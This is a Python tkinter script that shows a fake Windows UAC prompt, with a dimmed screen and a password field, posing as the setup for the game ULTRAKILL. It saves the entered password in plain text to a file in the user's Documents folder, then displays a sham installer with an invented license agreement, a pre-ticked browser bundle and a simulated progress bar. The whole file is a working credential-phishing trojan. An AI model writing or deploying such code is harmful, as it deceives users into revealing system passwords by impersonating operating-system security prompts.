import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import os
import time
import threading
import ctypes
import sys


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def save_password():
    password = entry.get()
    if not password:
        messagebox.showerror("Ошибка безопасности", "Пароль не может быть пустым")
        return

    try:
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        file_path = os.path.join(documents_path, 'system_password.txt')

        with open(file_path, 'w') as file:
            file.write(f"Пароль администратора: {password}")

        uac_window.destroy()
        dim_window.destroy()
        show_installer()

    except Exception as e:
        messagebox.showerror("Системная ошибка", f"Ошибка безопасности: {str(e)}")


def show_installer():
    installer = tk.Tk()
    installer.title("Установка Ultrakill")
    installer.geometry("650x500")
    installer.resizable(False, False)
    installer.configure(bg="#f0f0f0")
    installer.attributes("-topmost", True)

    # Заголовок
    header = tk.Frame(installer, bg="#2c2c2c", height=60)
    header.pack(fill=tk.X)

    tk.Label(header, text="Ultrakill Setup", fg="white", bg="#2c2c2c",
             font=("Arial", 14, "bold")).place(x=20, y=15)

    # Основной контент
    main_frame = tk.Frame(installer, bg="#f0f0f0")
    main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

    # Имитация логотипа
    logo_frame = tk.Frame(main_frame, bg="#e6e6e6", height=80)
    logo_frame.pack(fill=tk.X, pady=(0, 15))
    tk.Label(logo_frame, text="ULTRAKILL", bg="#e6e6e6", fg="#c00",
             font=("Arial", 24, "bold")).pack(pady=20)

    # Прогресс-бар
    tk.Label(main_frame, text="Ход установки:", bg="#f0f0f0", anchor="w",
             font=("Arial", 9)).pack(fill=tk.X, pady=(10, 0))

    progress_var = tk.DoubleVar()
    progress = ttk.Progressbar(main_frame, variable=progress_var, maximum=100,
                               mode="determinate", length=610)
    progress.pack(pady=5)

    status_var = tk.StringVar(value="Подготовка к установке...")
    tk.Label(main_frame, textvariable=status_var, bg="#f0f0f0", fg="#444",
             font=("Arial", 8)).pack(anchor="w")

    # Пользовательское соглашение
    agreement_frame = tk.LabelFrame(main_frame, text="Лицензионное соглашение",
                                    font=("Arial", 9, "bold"), bg="#f0f0f0")
    agreement_frame.pack(fill=tk.X, pady=15)

    agreement_text = scrolledtext.ScrolledText(agreement_frame, wrap=tk.WORD,
                                               height=8, font=("Arial", 8))
    agreement_text.pack(fill=tk.BOTH, padx=5, pady=5)

    # Генерация фиктивного соглашения
    agreement_content = """ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ

1. ПРАВА НА ИСПОЛЬЗОВАНИЕ
Разработчик предоставляет вам ограниченное, неисключительное право на установку и использование одного экземпляра Программного продукта ULTRAKILL (далее "Игра") на компьютере, находящемся под вашим контролем.

2. ОГРАНИЧЕНИЯ
Вы не имеете права:
- Распространять, копировать или перепродавать Игру
- Создавать производные произведения на основе Игры
- Использовать Игру в коммерческих целях
- Обходить системы защиты Игры

3. СОБРАННЫЕ ДАННЫЕ
Игра может собирать анонимные данные об использовании для улучшения качества продукта. Эти данные не содержат личную информацию.

4. ОТВЕТСТВЕННОСТЬ
Разработчик не несет ответственности за любой косвенный ущерб, возникший в результате использования Игры.

Нажимая "Принимаю", вы подтверждаете свое согласие с вышеуказанными условиями."""

    agreement_text.insert(tk.END, agreement_content)
    agreement_text.configure(state=tk.DISABLED)

    # Чекбоксы
    check_var1 = tk.IntVar(value=0)
    check_var2 = tk.IntVar(value=1)

    tk.Checkbutton(main_frame, text="Я принимаю условия соглашения", variable=check_var1,
                   bg="#f0f0f0", font=("Arial", 9)).pack(anchor="w", pady=(5, 0))

    tk.Checkbutton(main_frame, text="Установить Яндекс Браузер (рекомендуется)",
                   variable=check_var2, bg="#f0f0f0", font=("Arial", 9)).pack(anchor="w")

    # Кнопки
    btn_frame = tk.Frame(main_frame, bg="#f0f0f0")
    btn_frame.pack(fill=tk.X, pady=(20, 0))

    tk.Button(btn_frame, text="Назад", width=10,
              command=installer.destroy).pack(side=tk.LEFT)

    tk.Button(btn_frame, text="Отмена", width=10,
              command=installer.destroy).pack(side=tk.RIGHT, padx=5)

    install_btn = tk.Button(btn_frame, text="Установить", width=10, bg="#0046d5", fg="white",
                            command=lambda: start_installation(progress_var, status_var, install_btn, check_var1))
    install_btn.pack(side=tk.RIGHT)

    # Центрирование окна
    installer.update_idletasks()
    width = installer.winfo_width()
    height = installer.winfo_height()
    x = (installer.winfo_screenwidth() // 2) - (width // 2)
    y = (installer.winfo_screenheight() // 2) - (height // 2)
    installer.geometry(f'+{x}+{y}')

    installer.mainloop()


def start_installation(progress_var, status_var, install_btn, agreement_var):
    if not agreement_var.get():
        messagebox.showerror("Ошибка", "Вы должны принять условия лицензионного соглашения")
        return

    install_btn.configure(state=tk.DISABLED)

    def installation_thread():
        stages = [
            ("Проверка системных требований...", 10),
            ("Загрузка компонентов...", 25),
            ("Распаковка файлов...", 40),
            ("Оптимизация шейдеров...", 60),
            ("Настройка параметров...", 75),
            ("Создание ярлыков...", 90),
            ("Завершение установки...", 100)
        ]

        for status, value in stages:
            status_var.set(status)
            progress_var.set(value)
            time.sleep(0.7 + (value / 100))

        time.sleep(1)
        messagebox.showinfo("Установка завершена",
                            "ULTRAKILL успешно установлен на ваш компьютер!")
        os._exit(0)

    threading.Thread(target=installation_thread, daemon=True).start()


def create_uac_window():
    # Создаем окно затемнения (на весь экран)
    dim_window = tk.Tk()
    dim_window.overrideredirect(True)
    dim_window.geometry("{0}x{1}+0+0".format(dim_window.winfo_screenwidth(), dim_window.winfo_screenheight()))
    dim_window.attributes("-alpha", 0.4)
    dim_window.attributes("-topmost", True)
    dim_window.configure(bg='black')
    dim_window.attributes("-disabled", True)  # Блокируем взаимодействие

    # Создаем окно UAC
    uac_window = tk.Toplevel(dim_window)
    uac_window.title("Контроль учетных записей")
    uac_window.geometry("450x250")
    uac_window.resizable(False, False)
    uac_window.attributes("-topmost", True)
    uac_window.grab_set()  # Захватываем фокус
    uac_window.focus_force()

    # Стиль окна UAC Windows 10/11
    uac_window.configure(bg="#f0f0f0")  # Серый фон

    # Верхняя полоса (жёлто-оранжевая)
    header = tk.Frame(uac_window, bg="#ffc440", height=40)
    header.pack(fill=tk.X)
    tk.Label(header, text="Контроль учетных записей", fg="black", bg="#ffc440",
             font=("Segoe UI", 10, "bold")).place(x=10, y=10)

    # Иконка (щит)
    icon_frame = tk.Frame(uac_window, bg="#f0f0f0", width=50, height=50)
    icon_frame.place(x=20, y=50)
    tk.Label(icon_frame, text="⛨", bg="#f0f0f0", font=("Arial", 24), fg="#0057e2").pack()

    # Основной текст
    text_frame = tk.Frame(uac_window, bg="#f0f0f0")
    text_frame.place(x=80, y=50, width=350, height=100)

    tk.Label(text_frame, text="Вы хотите разрешить этому приложению внести изменения на вашем устройстве?",
             bg="#f0f0f0", font=("Segoe UI", 9), justify=tk.LEFT, wraplength=350).pack(anchor="w")

    tk.Label(text_frame, text="Программа: ULTRAKILL Setup", font=("Segoe UI", 8), bg="#f0f0f0", fg="#555").pack(
        anchor="w", pady=(5, 0))
    tk.Label(text_frame, text="Издатель: Hakita", font=("Segoe UI", 8), bg="#f0f0f0", fg="#555").pack(anchor="w")
    tk.Label(text_frame, text="Файл: C:\\Program Files\\Ultrakill\\Setup.exe", font=("Segoe UI", 8), bg="#f0f0f0",
             fg="#555").pack(anchor="w", pady=(2, 0))

    # Поле ввода пароля
    password_frame = tk.Frame(uac_window, bg="#f0f0f0")
    password_frame.place(x=80, y=150, width=350)

    tk.Label(password_frame, text="Пароль:", bg="#f0f0f0", font=("Segoe UI", 8)).pack(anchor="w")
    global entry
    entry = tk.Entry(password_frame, show="•", width=30, font=("Segoe UI", 10),
                     highlightthickness=1, highlightbackground="#b0b0b0")
    entry.pack(fill=tk.X, pady=(3, 0))
    entry.focus_set()

    # Кнопки
    btn_frame = tk.Frame(uac_window, bg="#f0f0f0")
    btn_frame.place(x=0, y=200, width=450, height=50)

    tk.Button(btn_frame, text="Да", width=10, bg="#e5e5e5",
              command=save_password).pack(side=tk.RIGHT, padx=10)

    tk.Button(btn_frame, text="Нет", width=10, bg="#e5e5e5",
              command=lambda: [uac_window.destroy(), dim_window.destroy()]).pack(side=tk.RIGHT)

    # Центрирование UAC окна
    uac_window.update_idletasks()
    width = uac_window.winfo_width()
    height = uac_window.winfo_height()
    x = (uac_window.winfo_screenwidth() // 2) - (width // 2)
    y = (uac_window.winfo_screenheight() // 2) - (height // 2)
    uac_window.geometry(f'+{x}+{y}')

    # При закрытии окна UAC уничтожаем затемнение
    uac_window.protocol("WM_DELETE_WINDOW", lambda: [uac_window.destroy(), dim_window.destroy()])

    dim_window.mainloop()


if __name__ == "__main__":
    if is_admin():
        messagebox.showinfo("Ошибка", "Программа уже запущена с правами администратора")
    else:
        create_uac_window()